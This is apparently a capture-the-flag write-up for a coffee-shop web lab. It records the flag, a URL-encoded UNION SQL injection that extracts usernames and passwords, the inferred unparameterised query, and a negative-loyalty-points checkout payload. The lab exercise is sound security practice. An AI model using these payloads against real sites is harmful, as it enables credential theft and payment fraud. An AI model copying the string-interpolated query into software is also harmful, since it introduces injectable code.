# cafeclub-002 - CafeClub Premium Coffee Experience

**Flag:** `bug{v3wjjmOVbCYE7R5nCdG4pmjjuvOOL8lu}`
**Difficulty:** Medium
**Lab URL:** https://lab-1781816402072-unkzex.labs-app.bugforge.io

## Vuln 1: UNION SQLi on GET /api/products/:id

**Endpoint:** `GET /api/products/:id`

The product ID path parameter is directly string-interpolated into the SQLite query with no parameterization:
```javascript
// Vulnerable code (inferred)
db.get(`SELECT * FROM products WHERE id = ${req.params.id}`)
```

**Exploit:** UNION SELECT with 8 columns matching the products table schema:
```
GET /api/products/0%20UNION%20SELECT%20null%2C(SELECT%20username||':'||password%20FROM%20users%20LIMIT%201)%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--%20-
```
Result appears in the `name` field of the JSON response.

Column count: 8 (id, name, description, price, image_url, category, stock, created_at)

**DB Schema extracted:**
- users, products, orders, order_items, favorites, reviews, cart_items
- Flag was in a user record (password field of seeded account)

## Vuln 2: Negative points_to_use (Business Logic)

**Endpoint:** `POST /api/checkout`

The `points_to_use` field accepts negative integers without validation. Sending a large negative value:
- Inflates the order total (adds to cart value instead of discounting)
- Earns points proportional to the inflated total
- Also credits the negative deduction as a credit (double dip)

**Exploit:**
```json
{"card_number": "4444 4444 4444 4444", "card_expiry": "12/25", "card_cvc": "123", "points_to_use": -9999999}
```
Result: `10019.98` total charged (inflated from $19.99), `10100018` points balance.

## Key recon notes
- Card format: `"4444 4444 4444 4444"` (spaces), fields: `card_expiry`, `card_cvc`
- Loyalty: 1 point per €1 spent; 100 points = €1 discount
- Reviews: `GET /api/products/:id/reviews`, `POST /api/products/:id/reviews`
- Rating CHECK constraint: `rating >= 1 AND rating <= 5` (blocks subquery injection since result must be int 1-5)
- GET reviews endpoint column count is 7+ (reviews JOIN users) - UNION didn't work here
- The flag was in users.password for a seeded account
